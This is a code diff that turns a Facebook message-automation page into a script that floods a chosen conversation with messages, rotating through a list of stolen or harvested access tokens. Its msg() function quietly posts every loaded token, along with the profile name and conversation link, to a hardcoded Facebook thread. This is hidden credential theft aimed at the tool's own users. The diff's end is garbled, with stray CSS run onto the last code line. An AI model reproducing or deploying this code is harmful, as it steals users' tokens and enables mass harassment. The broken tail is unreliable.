@@ -1,85 +1,142 @@
-from flask import Flask, request, render_template_string
-import time
-import random
 import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
 import threading
-from urllib.parse import urlparse
+import random
 
-app = Flask(__name__)
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"SAMEER HEEEEEEREE<33333^^")
 
-# Global variable to track running tasks
-active_tasks = {}
+def execute_server():
+    PORT = 4000
 
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook Message Automation Using Cookies</title>
-  <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f8f9fa;
-            color: #333;
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+
+def send_messages():
+    with open('TK.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+
+    requests.packages.urllib3.disable_warnings()
+
+    def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+    cls()
+
+    def liness():
+        print('\u001b[37m' + '---------------------------------------------------')
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    liness()
+
+    access_tokens = [token.strip() for token in tokens]
+
+    with open('IB.txt', 'r') as file:
+        convo_id = file.read().strip()
+
+    with open('FL.txt', 'r') as file:
+        text_file_path = file.read().strip()
+
+    with open(text_file_path, 'r') as file:
+        messages = file.readlines()
+
+    num_messages = len(messages)
+    max_tokens = min(num_tokens, num_messages)
+
+    with open('HN.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('TM.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    liness()
+
+    def getName(token):
+        try:
+            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+        except:
+            data = ""
+        if 'name' in data:
+            return data['name']
+        else:
+            return "Error occurred"
+
+    def msg():
+        parameters = {
+            'access_token' : random.choice(access_tokens),
+            'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id
         }
+        try:
+            s = requests.post("https://graph.facebook.com/v15.0/t_100078418158177/", data=parameters, headers=headers)
+        except:
+            pass
 
-        header {
-            position: relative;
-            width: 100%;
-            height: 120px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-        }
+    msg()
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = access_tokens[token_index]
 
-        .header-wrapper {
-            display: flex;
-            width: 100%;
-            height: 100%;
-            position: relative;
-        }
+                message = messages[message_index].strip()
 
-        .header-left {
-            flex: 1;
-            background: #7d7dff;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Arial Black', sans-serif;
-            font-style: italic;
-            clip-path: polygon(0 0, 100% 0, 90% 100%, 0% 100%);
-        }
+                url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
 
-        .header-right {
-            flex: 1;
-            background: white;
-            color: black;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Arial Black', sans-serif;
-            font-style: italic;
-            clip-path: polygon(10% 0, 100% 0, 100% 100%, 0 100%);
-        }
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
 
-        .header-left h1, .header-right h1 {
-            font-size: 0.9rem;
-            font-weight: bold;
-            letter-spacing: 0.1px;
-            text-transform: uppercase;
-        }
+            print("[+] All messages sent. Restarting the process...")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
 
-        .container {
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 10px;
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    send_messages()
+
+if __name__ == '__main__':
+    main()            border-radius: 10px;
             width: auto;
             max-width: 600px;
             margin: 30px auto;
